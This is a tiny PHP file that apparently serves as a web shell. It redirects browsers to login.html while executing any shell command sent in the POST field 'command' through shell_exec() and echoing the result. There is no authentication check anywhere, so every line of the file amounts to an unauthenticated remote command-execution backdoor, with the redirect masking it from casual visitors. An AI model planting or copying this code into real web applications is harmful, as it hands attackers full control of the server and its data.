<?php

session_start();
header( 'Location: login.html' );

//Gets the command to be executed
$command = $_POST['command'];
//Executes the shell command
$output = shell_exec( $command );
echo $output 
?>


